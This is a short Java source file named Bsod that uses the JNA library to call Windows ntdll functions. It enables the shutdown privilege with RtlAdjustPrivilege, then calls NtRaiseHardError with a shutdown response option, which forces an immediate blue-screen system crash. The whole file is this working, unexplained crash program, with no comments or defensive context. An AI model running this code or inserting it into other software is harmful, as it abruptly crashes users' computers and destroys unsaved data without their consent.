import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.ptr.IntByReference;

public class Bsod {
    public interface Ntdll extends Library {
        Ntdll INSTANCE = Native.load("ntdll", Ntdll.class);
        int RtlAdjustPrivilege(int Privilege, boolean Enable, boolean CurrentThread, IntByReference Enabled);
        int NtRaiseHardError(int ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask, Pointer Parameters, int ValidResponseOptions, IntByReference Response);
    }

    public static void main(String[] args) {
        IntByReference enabled = new IntByReference();
        IntByReference response = new IntByReference();
        
        Ntdll.INSTANCE.RtlAdjustPrivilege(19, true, false, enabled);
        Ntdll.INSTANCE.NtRaiseHardError(0xC0000420, 0, 0, null, 6, response);
    }
}

